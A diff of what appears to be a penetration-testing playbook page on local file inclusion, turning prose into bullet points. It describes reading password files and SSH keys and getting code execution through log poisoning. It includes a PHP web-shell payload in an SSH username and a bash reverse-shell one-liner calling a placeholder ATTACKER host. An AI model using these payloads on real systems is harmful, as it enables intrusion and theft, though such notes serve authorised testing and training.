@@ -12,9 +12,15 @@ leads_to:
 
 ## Prerequisites
 
-A file include parameter (`?page=`, `?file=`, `?view=`) that reflects content from disk. The web server process must be able to read the target file — check for errors vs. empty response to distinguish "file not found" from "permission denied".
+- A file include parameter (`?page=`, `?file=`, `?view=`) that reflects content from disk
 
-LFI lets you read any file the web process can access — `/etc/passwd`, SSH private keys, application configs with hardcoded credentials. The real prize is RCE: if you can write to a log file and read it back, you can inject PHP and execute commands. Log poisoning is the most reliable path; PHP wrappers are a fallback when logs aren't readable.
+- The web server process must be able to read the target file — compare errors vs. empty response to distinguish "file not found" from "permission denied"
+
+- Lets you read any file the web process can access — `/etc/passwd`, SSH private keys, app configs with hardcoded credentials
+
+- Real prize is RCE — write to a log file, read it back through the LFI, and you can inject PHP and execute commands
+
+- Log poisoning is the most reliable path; PHP wrappers are a fallback when logs aren't readable
 
 ## Quick Win
 
@@ -94,4 +100,10 @@ ssh "<?php system(\$_GET['cmd']); ?>"@$TARGET
 
 ## Leads To
 
-`/etc/shadow` readable → crack hashes offline. SSH private key found → `ssh -i id_rsa user@$TARGET`. Log poisoning RCE confirmed → swap `id` for a reverse shell one-liner (`bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'`) → rev-shell. PHP `data://` wrapper → direct command execution → rev-shell.
+- `/etc/shadow` readable → crack hashes offline
+
+- SSH private key found → `ssh -i id_rsa user@$TARGET`
+
+- Log poisoning RCE confirmed → swap `id` for a reverse shell one-liner (`bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'`) → `rev-shell`
+
+- PHP `data://` wrapper → direct command execution → `rev-shell`
